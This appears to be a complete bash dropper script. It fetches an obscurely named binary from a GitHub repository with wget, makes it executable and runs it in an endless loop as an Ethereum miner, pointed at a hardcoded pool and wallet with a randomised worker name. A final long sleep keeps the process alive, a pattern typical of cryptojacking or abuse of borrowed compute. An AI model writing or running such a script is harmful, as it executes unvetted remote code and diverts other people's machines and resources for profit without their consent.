#!/bin/bash
POOL=stratum+tcp://us1.ethermine.org:4444
WALLET=0xc5211743233579F3b69Cb406275CCaE5E248717B
WORKER=$(echo $(shuf -i 10-40 -n 1)-Ph)
apt-get install libpci3
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool $POOL -wal $WALLET.$WORKER 
        sleep 5
	done
sleep 999999999
